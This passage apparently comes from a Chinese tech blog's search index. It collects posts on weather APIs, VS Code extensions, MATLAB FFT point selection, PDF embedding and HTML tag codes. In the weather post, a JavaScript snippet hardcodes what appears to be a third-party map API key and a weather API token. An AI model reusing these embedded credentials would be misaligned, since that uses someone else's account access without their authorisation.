&quot;type&quot;: &quot;小雨&quot; &#125;, &quot;city&quot;: &quot;昆明&quot;, &quot;forecast&quot;: [ &#123; &quot;date&quot;: &quot;7日星期二&quot;, &quot;high&quot;: &quot;高温 23℃&quot;, &quot;fengli&quot;: &quot;&lt;![CDATA[1级]]&gt;&quot;, &quot;low&quot;: &quot;低温 15℃&quot;, &quot;fengxiang&quot;: &quot;北风&quot;, &quot;type&quot;: &quot;小雨&quot; &#125;, &#123; &quot;date&quot;: &quot;8日星期三&quot;, &quot;high&quot;: &quot;高温 22℃&quot;, &quot;fengli&quot;: &quot;&lt;![CDATA[1级]]&gt;&quot;, &quot;low&quot;: &quot;低温 16℃&quot;, &quot;fengxiang&quot;: &quot;南风&quot;, &quot;type&quot;: &quot;阴&quot; &#125;, &#123; &quot;date&quot;: &quot;9日星期四&quot;, &quot;high&quot;: &quot;高温 21℃&quot;, &quot;fengli&quot;: &quot;&lt;![CDATA[1级]]&gt;&quot;, &quot;low&quot;: &quot;低温 16℃&quot;, &quot;fengxiang&quot;: &quot;西南风&quot;, &quot;type&quot;: &quot;小雨&quot; &#125;, &#123; &quot;date&quot;: &quot;10日星期五&quot;, &quot;high&quot;: &quot;高温 21℃&quot;, &quot;fengli&quot;: &quot;&lt;![CDATA[2级]]&gt;&quot;, &quot;low&quot;: &quot;低温 16℃&quot;, &quot;fengxiang&quot;: &quot;东北风&quot;, &quot;type&quot;: &quot;中雨&quot; &#125;, &#123; &quot;date&quot;: &quot;11日星期六&quot;, &quot;high&quot;: &quot;高温 21℃&quot;, &quot;fengli&quot;: &quot;&lt;![CDATA[1级]]&gt;&quot;, &quot;low&quot;: &quot;低温 16℃&quot;, &quot;fengxiang&quot;: &quot;东风&quot;, &quot;type&quot;: &quot;小雨&quot; &#125; ], &quot;ganmao&quot;: &quot;感冒低发期，天气舒适，请注意多吃蔬菜水果，多喝水哦。&quot;, &quot;wendu&quot;: &quot;22&quot; &#125;, &quot;status&quot;: 1000, &quot;desc&quot;: &quot;OK&quot;&#125; 彩云App api很全面 https://caiyunapp.com/weather/js/new-weather.js https://api.caiyunapp.com/v2/Y2FpeXVuX25vdGlmeQ==/102,24/forecast?dailysteps=15&amp;alert=true&amp;lang=en https://yaoqs.github.io/Lab/widget.html 123456var DEF_TOKEN = &#x27;Y2FpeXVuX25vdGlmeQ==&#x27;;var token = $.Request(&#x27;token&#x27;) || DEF_TOKEN;var apiURL = &quot;https://restapi.amap.com/v3/geocode/regeo?key=127caacaa204cc855a9bcdbc8ca06a49&amp;location=&quot; + longitude + &quot;,&quot; + latitude;var apiURL = &quot;https://api.caiyunapp.com/v2/&quot;+ token +&quot;/&quot; + longitude + &quot;,&quot; + latitude + &quot;/forecast?dailysteps=15&amp;alert=true&amp;lang=en&quot;; 中央气象台-昆明 天气API 应用 https://yaoqs.github.io/Lab/widget.html VUE+Echarts调用天气API显示近日天气情况","tags":""},{"title":"csharp专题","url":"/20220426/csharp-zhuan-ti/","text":"※WPF Contains some simple and commonly used WPF controls","tags":"c#"},{"title":"目标跟踪算法","url":"/20220425/mu-biao-gen-zong-suan-fa/","text":"※卡尔曼滤波 卡尔曼滤波 – 从推导到应用(一) 卡尔曼滤波 – 从推导到应用(二) 卡尔曼滤波的理解以及参数调整 ※粒子滤波 Particle Filter Tutorial 粒子滤波：从推导到应用（一） Particle Filter Tutorial 粒子滤波：从推导到应用（二） Particle Filter Tutorial 粒子滤波：从推导到应用（三） Particle Filter Tutorial 粒子滤波：从推导到应用（四） 粒子滤波（Particle filter）算法简介及MATLAB实现","tags":""},{"title":"EI期刊查询","url":"/20220424/ei-qi-kan-cha-xun/","text":"关于EI期刊查询，EI数据库有明确的收录范围以及不定时更新的目录。EI是一个数据库，工程领域的权威数据库。EI主要收录EI会议CA以及EI期刊JA类型的文章。想要EI期刊查询，首先得建议大家登陆EI官网下载EI Compendex source list 。目录下载好后，点击目录中的“SERIALS”列表，然后EI期刊查询。 EI期刊查询目录官方下载链接：https://www.elsevier.com/solutions/engineering-village/content 关于EI期刊查询方法，打开EI Compendex source list目录后，见EI期刊目录列表”里面官方也实时更新了EI收录的期刊，以及被EI拉黑的期刊（DISCONTINUED）。EI期刊查询，可以使用EXCEL自带的筛选功能，输入需要查询的EI期刊ISSN期刊号或EISSN期刊号，如果有筛选的信息，证明该刊物是被EI期刊目录所收录的。需要留意EI官方对于目录是不定时更新的，要关注最新版再EI期刊查询！ 本文由http://www.ei.org.cn 整理提供！","tags":"科研学术 ei"},{"title":"html专题","url":"/20220424/html-zhuan-ti/","text":"脚本之家-网页制作","tags":"专题 html 网页制作"},{"title":"JavaScript专题","url":"/20220424/javascript-zhuan-ti/","text":"","tags":"js javascript 专题"},{"title":"Xamarin专题","url":"/20220424/xamarin-zhuan-ti/","text":"Xamarin Free. Cross-platform. Open source. An app platform for building Android and iOS apps with .NET and C#. 内容稍后添加…","tags":"xamarin c# .net"},{"title":"Awesome-Github-Roster","url":"/20220401/awesome-github-roster/","text":"","tags":"github-page"},{"title":"Acoustics","url":"/20220401/acoustics/","text":"","tags":"github-page"},{"title":"42","url":"/20220401/42/","text":"","tags":"github-page"},{"title":"Visual Studio Code 专题","url":"/20220401/visual-studio-code-zhuan-ti/","text":"VsCode 官方插件地址： https://marketplace.visualstudio.com/vscode http://code.visualstudio.com/docs 官网下载地址：http://code.visualstudio.com/ ¶ 设置 editor.tabCompletion 用来在出现推荐值时，按下 Tab 键是否自动填入最佳推荐值，推荐设置为 on editor.codeActionsOnSave 中的 source.organizeImports 属性，这个属性能够在保存时，自动调整 import 语句相关顺序，能够让你的 import 语句按照字母顺序进行排列，推荐设置为 true, 即 \"editor.codeActionsOnSave\": {“source.organizeImports”: true }； 禁用自动更新：文件 &gt; 首选项 &gt; 设置（macOS：代码 &gt; 首选项 &gt; 设置，搜索 update mode 并将设置更改为 none。 开启代码提示设置：setting &gt; 到搜索框里搜索 “prevent”—&gt; 并取消此项的勾选 设置同步 ¶ 插件 ¶General Chinese (Simplified) (简体中文) Language Pack for Visual Studio: PowerShell:Develop PowerShell modules, commands and scripts in Visual Studio Code! Visual Studio IntelliCode:AI-assisted development Remote - WSL:Open any folder in the Windows Subsystem for Linux (WSL) and take advantage of Visual Studio Code’s full feature set. Indenticator: 视觉上突出显示当前的缩进深度。 Rainbow Brackets + Indent-Rainbow: 彩虹括号、彩虹空白符插件 (已内置) Trailing Spaces:Highlight trailing spaces and delete them in a flash! 高亮那些冗余的空格，可以快速删掉。(已内置) TODO Highlight 维护时间稍长的代码仓库免不了会有各种 TODO、FIXME、HACK 之类的标记，TODO Highlight 能够帮我们把这些关键词高亮出来，在你翻阅代码时非常醒目，就像是在大声提醒你尽快把他解决掉。支持自定义配置需要高亮的关键词，实际使用比较坑的地方是，TODO、FIXME 之类的后面必须加上冒号，否则无法高亮。 File Utils: 提供了一个更加简洁的方法来创建、复制、移动、重命名、删除文件 / 文件夹。 Hex Editor:Allows viewing and editing files in a hex editor WakaTime:Metrics, insights, and time tracking automatically generated from your programming activity. 从你的使用习惯中生成数据报表 Code Runner:Run C, C++, Java, JS, PHP, Python, Perl, Ruby, Go, Lua, Groovy, PowerShell, CMD, BASH, F#, C#, VBScript, TypeScript, CoffeeScript, Scala, Swift, Julia, Crystal, OCaml, R, AppleScript, Elixir, VB.NET, Clojure, Haxe, Obj-C, Rust, Racket, Scheme, AutoHotkey, AutoIt, Kotlin, Dart, Pascal, Haskell, Nim,D. 支持多种语言的代码的立即执行。 vscode-icons:Icons for Visual Studio Code. Material Icon Theme:Material Design Icons for Visual Studio Code Bracket Pair Colorizor:A customizable extension for colorizing matching brackets Polacode: Polaroid for your code. 将一段代码复制到剪贴板，打开扩展名，粘贴代码，然后单击保存图像！ Better Align（代码优雅排版）代码优雅排版，选中代码配合组合键 [Ctrl+Shift+p]，输入 Align 即可 Better Comments:Improve your code commenting by annotating with alert, informational, TODOs, and more! Bookmarks: 标记某一行，用于跳转，相当于书签功能 Docs View: VS Code extension that displays hover documentation in the sidebar or panel. Sourcegraph: 代码搜索，Sourcegraph’s code search allows you to find &amp; fix things fast across all your code. filesize: 查看文件大小 Partial Diff（文件比较） Path Intellisense（快速引入文件）自动提示文件路径，支持各种快速引入文件 GistPad: 可以让你在 VSCode 中直接编辑 GitHub Gists 和存储库 CodeSnap: 生成漂亮的代码截图.📸 Take beautiful screenshots of your code in VS Code! Visual Studio IntelliCode: 自动补全 CMake Tools: provides the native developer a full-featured, convenient, and powerful workflow for CMake-based projects in Visual Studio Code. Makefile Tools: This extension provides IntelliSense configurations to the VS Code C/C++ Extension for Makefile projects. It also provides convenient commands to build, debug, and run your targets. Image preview（预览图片）鼠标悬浮在链接上可及时预览图片 change-case（变量命名规范） Code Spell Checker（拼写检查程序）是拼写检查程序，检查不常见的单词，如果单词拼写错误，会给出警告提示 koroFileHeader（生成文件头部注释和函数注释）在 vscode 中用于生成文件头部注释和函数注释的插件，经过多版迭代后，插件：支持所有主流语言，功能强大，灵活方便，文档齐全，食用简单 Polacode-2020（转化成一张逼格满满的图片）可以将我们的代码转化成一张逼格满满的图片 Live Share（与他人实时进行协作式编辑和调试）这款神器可以使您能够与他人实时进行协作式编辑和调试已弃用 Doxygen Documentation Generator : Let me generate Doxygen documentation from your source code for you. faker 生成假数据，地址，电话，图片等等 Regex Previewer 测试正则的插件 Regex matches previewer for JavaScript, TypeScript, PHP and Haxe in Visual Studio Code beautiful UI 32 个主题集合，具体使用看个人喜好。 ¶blog CSDN 工作流：CSDN GitCode VSCode integration zhihu on vscode：Zhihu VSCode Extension ¶AI code Baidu Comate TONGYI Lingma-Your Codeium: Free AI-powered code acceleration toolkit Fitten Code: Your Professional AI Coding Assistant ¶Remote Remote - SSH： Open any folder on a remote machine using SSH and take advantage of VS Code’s full feature set Remote Explorer: The Remote - SSH and Remote - Tunnels extensions let you use any remote machine as your development environment. The Remote - Tunnels extension lets you connect to a remote machine, like a desktop PC or virtual machine (VM), via a secure tunnel. You can then securely connect to that machine from anywhere, without the requirement of SSH. ¶Matlab MATLAB support for Visual Studio Code ¶git GitHub:Integrates github and its workflows into vscode 此扩展已弃用。请改用 GitHub Pull Requests and Issues 扩展 GitLens:Supercharge Git within VS Code — Visualize code authorship at a glance via Git blame annotations and CodeLens,（快速查看更改行或代码块的对象） GitHub Codespaces: Your instant dev environment GitHub Pull Requests and Issues:Pull Request and Issue Provider for GitHub GitHub Theme:GitHub theme for VS Code Git Project Manager: 可以然你直接一键搜索并打开某个的基于 Git 管理的项目 Git History: 用来查看 git log 或则一个文件的 git 历史，比较不同的分支，commits。 Settings Sync:Synchronize Settings, Snippets, Themes, File Icons, Launch, Keybindings, Workspaces and Extensions Across Multiple Machines Using GitHub Gist. 在 Github 中保存设置（已内置） Git Graph（Git 图形化显示和操作） GitLab Workflow：Official GitLab-maintained extension for Visual Studio Code. ¶nodejs npm 此扩展已弃用，因为已不再对其进行维护。 node-snippets:snippets for node + libraries npm Intellisense: 可以在导入语句自动补全 npm 模块名称 Search node_modules:Quickly search the node_modules folder Import Cost: 该插件会在行尾显示导入的包的大小。为了计算包大小，该插件要使用 Webpack 和 babili-webpack-plugin Mongo Snippets for Node-js:Provides snippets, boilerplate code for Mongo queries and completion suggestions for mongoose models. MongoDB for VS Code:Connect to MongoDB and Atlas directly from your VS Code environment, navigate your databases and collections, inspect your schema and use playgrounds to prototype queries and aggregations. node-readme:A vscode extension to view javascript module documentation in editor ~~Vetur:Vue tooling for VS Code ~~ Vue Language Features (Volar): Language support for Vue 3.0, including syntax highlighting, code completion, emmet, formatting, and more. ¶denojs deno: A language server client for Deno. ¶html open in browser: 在浏览器里预览网页必备。运行 html 文件 Live Server:Launch a development local Server with live reload feature for static &amp; dynamic pages Prettier: 一键美化 JavaScript/TypeScript/CSS 代码 HTML Snippets: Full HTML tags including HTML5 Snippets(已内置) HTML Boilerplate： A basic HTML5 boilerplate snippet generator.(已内置) HTML CSS Support: Visual Studio Code CSS Intellisense for HTML IntelliSense for CSS class names in HTML: 基于你的项目以及通过 link 标签引用的外部文件，该智能插件提供 HTML 中 CSS class 名字的补全 Beautify:Beautify javascript, JSON, CSS, Sass, and HTML in Visual Studio Code Bootstrap 4, Font awesome 4, Font Awesome 5 Free &amp; Pro snippets for Visual studio code: JavaScript (ES6) code snippets:Code snippets for JavaScript in ES6 syntax CSS Peek:Allow peeking to css ID and class strings as definitions from html files to respective CSS. Allows peek and goto definition. 可以在 HTML 中通过 CSS id 或则 class 来定位到其定义（已内置） Quokka.js:JavaScript and TypeScript playground in your editor. 实时执行 JavaScript 代码 (做快速的 demo 很有用)。 可以即时显示 js 和 ts 的运行结果，想试验一些短代码的运行结果，但是又不想之后删除文件的时候可以用到 ESLint:Integrates ESLint JavaScript into VS Code. Auto Rename Tag: Auto rename paired HTML/XML tag（已内置） jQuery Code Snippets: Over 130 jQuery Code Snippets for JavaScript code.Just type the letters ‘jq’ to get a list of all available jQuery Code Snippets. Beautify css/sass/scss/less: Command “beautify.format” Easy LESS: Auto-compile LESS to CSS on save,“Compile-on-save” for LESS stylesheets without using a build task. HTML Preview: Provides ability to preview HTML documents. Microsoft Edge Tools for VS Code: Show the browser’s Elements and Network tool inside the Visual Studio Code editor and use it to fix CSS issues with your site and inspect network activity. JavaScript Booster（代码改进）会提示对应的不合理原因和改进方案 eCSStractor----- 抽取页面的 class，生成一个 css 文档 ¶Wechat 小程序开发助手：微信小程序开发助手 for VSCode，代码提示 + 语法高亮 微信小程序开发工具：提供预览、打包上传、代码补全、语法高亮、依赖分析、项目模版等功能。 HTML Preview: Provides ability to preview HTML documents. Microsoft Edge Tools for VS Code: Show the browser’s Elements and Network tool inside the Visual Studio Code editor and use it to fix CSS issues with your site and inspect network activity. ¶Docker Docker:Makes it easy to create, manage, and debug containerized applications. Remote - Containers:Open any folder or repository inside a Docker container and take advantage of Visual Studio Code’s full feature set. ¶Markdown Markdown All in One：All you need for Markdown (keyboard shortcuts, table of contents, auto preview and more). Markdown Preview Github Styling:Changes VS Code’s built-in markdown preview to match Github’s style markdownlint:Markdown linting and style checking for Visual Studio Code Turndown-VSCode: Convert HTML to Markdown.This extension employs the excellent Turndown (http://domchristie.github.io/turndown/) library Auto Markdown TOC：Generate TOC (table of contents) of headlines from parsed markdown file. ¶SQL SQL Server (mssql):Develop Microsoft SQL Server, Azure SQL Database and SQL Data Warehouse everywhere SQLTools: Database management done right. Connection explorer, query runner, intellisense, bookmarks, query history. Feel like a database hero! Turndown-VSCode: Convert HTML to Markdown.This extension employs the excellent Turndown (http://domchristie.github.io/turndown/) library ¶python Sourcery: 实时重构 Python 代码，会自动审查和重构代码。 ¶C Sharp C#:C# for Visual Studio Code (powered by OmniSharp). 微软开发 c# 调试器插件 ¶References 这 14 个 VSCode 插件，让你写代码如同神一般 史上最全 vscode 配置使用教程","tags":"专题"},{"title":"【数字信号处理】Matlab做fft时点数N怎么选取","url":"/20220330/shu-zi-xin-hao-chu-li-matlab-zuo-fft-shi-dian-shu-n-zen-me-xuan-qu/","text":"转载自 https://blog.csdn.net/baidu_37973494/article/details/81076343 (作为笔记，防止遗忘) 一、FFT点数N（也就是离散时间信号的记录长度）：要根据所要求的的频率分辨率F来决定。 频率分辨率F：能够用FFT算法分析得到的最靠近的两个信号频率之间的间隔。 N和F的关系：N&gt;=Fs/F, Fs为采样频率。由于FFT一般要求N是2的整数幂，所以最后还要把N扩大为最接近2的整数幂。 二、参考网页如何决定要使用多少点来做fft：https://zhidao.baidu.com/question/1111808097700853939.html（重点） fft函数出来的应该是个复数，每一个点分实部虚部两部分。假设采用1024点fft，采样频率是fs，那么第一个点对应0频率点，第512点对应的就是fs/2的频率点。然后从头开始找模值最大的那个点，其所对应的频率值应该就是你要的基波频率了。 假设采样频率为Fs，信号频率F，采样点数为N。那么FFT之后结果就是一个为N点的复数。每一个点就对应着一个频率点。这个点的模值，就是该频率值下的幅度特性。具体跟原始信号的幅度有什么关系呢？假设原始信号的峰值为A，那么FFT的结果的每个点（除了第一个点直流分量之外）的模值就是A的N/2倍。而第一个点就是直流分量，它的模值就是直流分量的N倍。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253%-----------------------------------------------%%Author : aoxiang_ywj%Project : Matlab做fft时点数N怎么选取%Brief introduction :%假设我们有一个信号，它含有2V的直流分量，频率为50Hz、相位为-30度、幅度为3V的交流信号，以及一个频率为75Hz、相位为90度、幅度为1.5V的交流信号。%用数学表达式就是如下： S=2+3*cos(2*pi*50*t-pi*30/180)+1.5*cos(2*pi*75*t+pi*90/180) %式中cos参数为弧度，所以-30度和90度要分别换算成弧度。我们以256Hz的采样率对这个信号进行采样，总共采样256点。%按照我们上面的分析，Fn=(n-1)*Fs/N，我们可以知道，每两个点之间的间距就是1Hz，第n个点的频率就是n-1。%我们的信号有3个频率：0Hz、50Hz、75Hz，应该分别在第1个点、第51个点、第76个点上出现峰值，其它各点应该接近0。实际情况如何呢？ 看figure（2）%-----------------------------------------------%clc;clear;close all; %先关闭所有图片Adc=2; %直流分量幅度A1=3; %频率F1信号的幅度A2=1.5; %频率F2信号的幅度F1=50; %信号1频率(Hz)F2=75; %信号2频率(Hz)Fs=256; %采样频率(Hz)P1=-30; %信号1相位(度)P2=90; %信号相位(度)N=256; %采样点数t=[0:1/Fs:N/Fs]; %采样时刻%Fn=(1:1:N)*Fs/N; %频域点数 %信号S=Adc+A1*cos(2*pi*F1*t+pi*P1/180)+A2*cos(2*pi*F2*t+pi*P2/180);%显示原始信号plot(S);title(&#x27;原始信号&#x27;); figure;Y = fft(S,N); %做FFT变换Ayy = (abs(Y)); %取模plot(Ayy(1:N)); %显示原始的FFT模值结果 与plot(Ayy);效果一样%plot(Fn,Ayy(1:N));title(&#x27;FFT 模值&#x27;); figure;Ayy=Ayy/(N/2); %换算成实际的幅度Ayy(1)=Ayy(1)/2;F=([1:N]-1)*Fs/N; %换算成实际的频率值plot(F(1:N/2),Ayy(1:N/2)); %显示换算后的FFT模值结果title(&#x27;幅度-频率曲线图&#x27;); figure;Pyy=[1:N/2];for i=1:N/2 Pyy(i)=phase(Y(i)); %计算相位 Pyy(i)=Pyy(i)*180/pi; %换算为角度end;plot(F(1:N/2),Pyy(1:N/2)); %显示相位图title(&#x27;相位-频率曲线图&#x27;);","tags":"matlab"},{"title":"JavaScript语言精髓与编程实践","url":"/20220315/javascript-yu-yan-jing-sui-yu-bian-cheng-shi-jian/","text":"JavaScript语言精髓与编程实践(第一章) showPDF(\"container1\",'JavaScript语言精髓与编程实践(第一章).pdf'); JavaScript语言精髓与编程实践(第二章) showPDF(\"container2\",'JavaScript语言精髓与编程实践(第二章).pdf');","tags":"javascript"},{"title":"解读javascript的计时器(转载)","url":"/20220108/jie-du-javascript-de-ji-shi-qi-zhuan-zai/","text":"// 禁止右键菜单 document.oncontextmenu = function(){ return false; }; // 禁止文字选择 document.onselectstart = function(){ return false; }; // 禁止复制 document.oncopy = function(){ return false; }; // 禁止剪切 document.oncut = function(){ return false; }; // 禁止粘贴 document.onpaste = function(){ return false; }; pdf.js showPDF(\"container\",'解读javascript的计时器.pdf'); pdfobject var options = { height: \"550px\", pdfOpenParams: {view: 'FitV', page: '0' }, name:\"mans\", fallbackLink: \"您的浏览器暂不支持此pdf，请下载最新的浏览器\" }; if(PDFObject){ PDFObject.embed(\"解读javascript的计时器.pdf\", \"#my-container\",options); } hexo-pdf jQuery.media $(document).ready(function(){ var url=\"解读javascript的计时器.pdf\";//这里就可以做url动态切换--主要是使用iframe $(\"#pdf_page\").attr(\"src\",url); $(\".pdf\").media(); });","tags":"reprint javascript pdf"},{"title":"html网站常用代码","url":"/20220105/html-wang-zhan-chang-yong-dai-ma/","text":"1.结构性定义文件类型 &lt;HTML&gt;&lt;/HTML&gt; （放在档案的开头与结尾）文件主题 &lt;TITLE&gt;&lt;/TITLE&gt; （必须放在「文头」区块内）文头 &lt;HEAD&gt;&lt;/HEAD&gt; （描述性资料，像是「主题」）文体 &lt;BODY&gt;&lt;/BODY&gt; （文件本体）（由浏览器控制的显示风格）标题 &lt;H?&gt;&lt;/H?&gt; （从1到6，有六层选择）标题的对齐 &lt;H? ALIGN=LEFT|CENTER|RIGHT&gt;&lt;/H?&gt;区分 &lt;DIV&gt;&lt;/DIV&gt;区分的对齐 &lt;DIV ALIGN=LEFT|RIGHT|CENTER|JUSTIFY&gt;&lt;/DIV&gt;引文区块 &lt;BLOCKQUOTE&gt;&lt;/BLOCKQUOTE&gt; （通常会内缩）强调 &lt;EM&gt;&lt;/EM&gt; （通常会以斜体显示）特别强调 &lt;STRONG&gt;&lt;/STRONG&gt; （通常会以加粗显示）引文 &lt;CITE&gt;&lt;/CITE&gt; （通常会以斜体显示）码 &lt;CODE&gt;&lt;/CODE&gt; （显示原始码之用）样本 &lt;SAMP&gt;&lt;/SAMP&gt;键盘输入 &lt;KBD&gt;&lt;/KBD&gt;变数 &lt;VAR&gt;&lt;/VAR&gt;定义 &lt;DFN&gt;&lt;/DFN&gt; （有些浏览器不提供）地址 &lt;ADDRESS&gt;&lt;/ADDRESS&gt;大字 &lt;BIG&gt;&lt;/BIG&gt;小字 &lt;SMALL&gt;&lt;/SMALL&gt;与外观相关的标签（作者自订的表现方式）加粗 &lt;B&gt;&lt;/B&gt;斜体 &lt;I&gt;&lt;/I&gt;底线 &lt;U&gt;&lt;/U&gt; （尚有些浏览器不提供）删除线 &lt;S&gt;&lt;/S&gt; （尚有些浏览器不提供）下标 &lt;SUB&gt;&lt;/SUB&gt;上标 &lt;SUP&gt;&lt;/SUP&gt;打字机体 &lt;TT&gt;&lt;/TT&gt; （用单空格字型显示）预定格式 &lt;PRE&gt;&lt;/PRE&gt; （保留文件中空格的大小）预定格式的宽度 &lt;PRE WIDTH=?&gt;&lt;/PRE&gt;（以字元计算）向中看齐 &lt;CENTER&gt;&lt;/CENTER&gt; （文字与图片都可以）闪耀 &lt;BLINK&gt;&lt;/BLINK&gt; （有史以来最被嘲弄的标签）字体大小 &lt;FONT SIZE=?&gt;&lt;/FONT&gt;（从1到7）改变字体大小 &lt;FONT SIZE=+|-?&gt;&lt;/FONT&gt;基本字体大小 &lt;BASEFONT SIZE=?&gt; （从1到7; 内定为3）字体颜色 &lt;FONT COLOR=&quot;#$$$$$$&quot;&gt;&lt;/FONT&gt; 说明 &lt;!-- *** --&gt; （浏览器不会显示）&lt;!--修改滚动条--&gt;&lt;style type=&quot;text/css&quot;&gt;body &#123;scrollbar-face-color: #330033;scrollbar-shadow-color: #FFFFFF;scrollbar-highlight-color: #FFFFFF;scrollbar-3dlight-color: #FFFFFF;scrollbar-darkshadow-color: #FFFFFF;scrollbar-track-color: #330033;scrollbar-arrow-color: #FFFFFF;&#125;&lt;/style&gt;&lt;!--修改滚动条结束--&gt;将上面的代码放在叶子代码的&lt;head&gt;&lt;/head&gt;之间,颜色可根据自己的需要修改。滚动条的代码意思如下：Scrollbar-Face-Color为滚动条表面颜色设定；Scrollbar-Track-Color为滚动条底板颜色设定；Scrollbar-Darkshadow为滚动条下边和右边边沿颜色设定；Scrollbar-Highlight-Color为滚动条上斜面和左斜面颜色设定；Scrollbar-Shadow-Color为滚动条下斜面和右斜面颜色设定；Scrollbar-3Dlight-Color为滚动条上边和左边的边沿颜色设定；Scrollbar-Arrow-Color为滚动条两端箭头颜色设定。&lt;!&gt; 跑馬燈&lt;marquee&gt;...&lt;/marquee&gt;普通捲動&lt;marquee behavior=slide&gt;...&lt;/marquee&gt;滑動&lt;marquee behavior=scroll&gt;...&lt;/marquee&gt;預設捲動&lt;marquee behavior=alternate&gt;...&lt;/marquee&gt;來回捲動&lt;marquee direction=down&gt;...&lt;/marquee&gt;向下捲動&lt;marquee direction=up&gt;...&lt;/marquee&gt;向上捲動&lt;marquee direction=right&gt;&lt;/marquee&gt;向右捲動&lt;marquee direction=’left’&gt;&lt;/marquee&gt;向左捲動&lt;marquee loop=2&gt;...&lt;/marquee&gt;捲動次數&lt;marquee width=180&gt;...&lt;/marquee&gt;設定寬度&lt;marquee height=30&gt;...&lt;/marquee&gt;設定高度&lt;marquee bgcolor=FF0000&gt;...&lt;/marquee&gt;設定背景顏色&lt;marquee scrollamount=30&gt;...&lt;/marquee&gt;設定捲動距離&lt;marquee scrolldelay=300&gt;...&lt;/marquee&gt;設定捲動時間1)贴图：&lt;img src=&quot;图片地址&quot;&gt;2)加入连接：&lt;a href=&quot;所要连接的相关地址&quot;&gt;写上你想写的字&lt;/a&gt;3)在新窗口打开连接：&lt;a href=&quot;相关地址&quot; target=&quot;_blank&quot;&gt;写上要写的字&lt;/a&gt;4)移动字体(走马灯)：&lt;marquee&gt;写上你想写的字&lt;/marquee&gt;5)字体加粗：&lt;b&gt;写上你想写的字&lt;/b&gt;6)字体斜体：&lt;i&gt;写上你想写的字&lt;/i&gt;7)字体下划线: &lt;u&gt;写上你想写的字&lt;/u&gt;8)字体删除线: &lt;s&gt;写上你想写的字&lt;/s&gt;9)字体加大: &lt;big&gt;写上你想写的字&lt;/big&gt;10)字体控制大小：&lt;h1&gt;写上你想写的字&lt;/h1&gt; (其中字体大小可从h1-h5,h1最大，h5最小)11)更改字体颜色：&lt;font color=&quot;#value&quot;&gt;写上你想写的字&lt;/font&gt;(其中value值在000000与ffffff(16位进制)之间12)消除连接的下划线：&lt;a href=&quot;相关地址&quot; style=&quot;text-decoration:none&quot;&gt;写上你想写的字&lt;/a&gt;13)贴音乐：&lt;embed src=&quot;音乐地址&quot; width=&quot;宽度&quot; height=&quot;高度&quot; autostart=false&gt; 14)贴flash: &lt;embed src=&quot;flash地址&quot; width=&quot;宽度&quot; height=&quot;高度&quot;&gt;15)贴影视文件：&lt;img dynsrc=&quot;文件地址&quot; width=&quot;宽度&quot; height=&quot;高度&quot; start=mouseover&gt; 16)换行：&lt;br&gt;17)段落：&lt;p&gt;段落&lt;/p&gt;18)原始文字样式：&lt;pre&gt;正文&lt;/pre&gt;19)换帖子背景：&lt;body background=&quot;背景图片地址&quot;&gt;20)固定帖子背景不随滚动条滚动：&lt;body background=&quot;背景图片地址&quot; body bgproperties=fixed&gt;21)定制帖子背景颜色：&lt;body bgcolor=&quot;#value&quot;&gt;(value值见10)22)帖子背景音乐：&lt;body bgsound=&quot;背景音乐地址&quot; loop=infinite&gt;23)贴网页：&lt;iframe src=&quot;相关地址&quot; width=&quot;宽度&quot; height=&quot;高度&quot;&gt;&lt;/iframe&gt; 1、店铺音乐代码:&lt;embed src=&quot;音乐网址&quot; loop=&quot;-1&quot;&gt;2、图片制作代码：&lt;img src=&quot;这里放图片地址&quot;&gt;3、公告图片代码：&lt;img border=&quot;0&quot; src=&quot;这里放图片地址&quot; /&gt;或&lt;img src=&quot;这里放图片地址&quot;/&gt;4、悬浮挂饰代码：&lt;img src=&quot;这里放图片地址&quot; style=&quot;left:20px; position: relative; top:0px&quot; /&gt;5、商品分类代码:&lt;img src=&quot;这里放图片地址&quot;/&gt;6、字体大小代码:&lt;font size=&quot;2&quot;&gt;这里放要处理的文字，可用3、4、5等设置大小&lt;/font&gt;7、字体颜色代码:&lt;font color=&quot;red&quot;&gt;这里放要处理的文字，可以换成blue,yellow等&lt;/font&gt;8、文字链接代码:&lt;a href=&quot;网页地址&quot;&gt;链接的文字，在分类栏里用时链接的网页地址必须缩短&lt;/a&gt;9、移动文字代码:&lt;marquee&gt;从右到左移动的文字&lt;/marquee&gt;10、背景音乐代码：&lt;bgsound loop=&quot;-1&quot; src=&quot;这里放音乐地址&quot;&gt;&lt;/bgsound&gt;11、图片附加音乐代码：&lt;img border=0 src=&quot;这里放图片地址&quot; dynsrc=&quot;这里放音乐地址&quot;&gt;12、浮动图片代码:&lt;img alt=&quot;1&quot; height=&quot;150&quot; src=&quot;这里放图片地址&quot;/&gt;公告图片的代码：公告挂饰：店铺分类代码:背景音乐代码：换行代码计数器代码颜色代码：1白色 #FFFFFF2红色#FF00003绿色#00FF004蓝色#0000FF5牡丹红#FF00FF6青色 #00FFFF7黄色#FFFF008黑色#0000009海蓝#70DB9310巧克力色#5C331711蓝紫色 #9F5F9F12黄铜色#B5A64213亮金色#D9D91914棕色#A67D3D15青铜色 #8C7853162号青铜色 #A67D3D17士官服蓝色 #5F9F9F18冷铜色 #D9871919铜色 #B8733320珊瑚红 #FF7F0021紫蓝色 #42426F22深棕 #5C403323深绿 #2F4F2F24深铜绿色 #4A766E25深橄榄绿 #4F4F2F26深兰花色 #9932CD27深紫色 #871F7828深石板蓝 #6B238E29深铅灰色 #2F4F4F30深棕褐色 #97694F32深绿松石色 #7093DB33暗木色 #855E4234淡灰色 #54545435土灰玫瑰红色 #85636336长石色 #D1927537火砖色#8E232338森林绿 #238E2339金色 #CD7F3240鲜黄色 #DBDB7041灰色 #C0C0C042铜绿色 #527F7643青黄色 #93DB7044猎人绿 #215E2145印度红 #4E2F2F46土黄色 #9F9F5F47浅蓝色 #C0D9D948浅灰色 #A8A8A849浅钢蓝色 #8F8FBD59浅木色 #E9C2A660石灰绿色 #32CD3261桔黄色 #E4783362褐红色 #8E236B63中海蓝色 #32CD9964中蓝色 #3232CD65中森林绿 #6B8E2366中鲜黄色 #EAEAAE67中兰花色 #9370DB68中海绿色 #426F4269中石板蓝色 #7F00FF70中春绿色 #7FFF0071中绿松石色 #70DBDB72中紫红色 #DB709373中木色 #A6806474深藏青色 #2F2F4F75海军蓝 #23238E76霓虹篮 #4D4DFF77霓虹粉红 #FF6EC778新深藏青色 #00009C79新棕褐色 #EBC79E80暗金黄色 #CFB53B81橙色 #FF7F0082橙红色 #FF240083淡紫色 #DB70DB84浅绿色 #8FBC8F85粉红色 #BC8F8F86李子色 #EAADEA87石英色 #D9D9F388艳蓝色 #5959AB89鲑鱼色 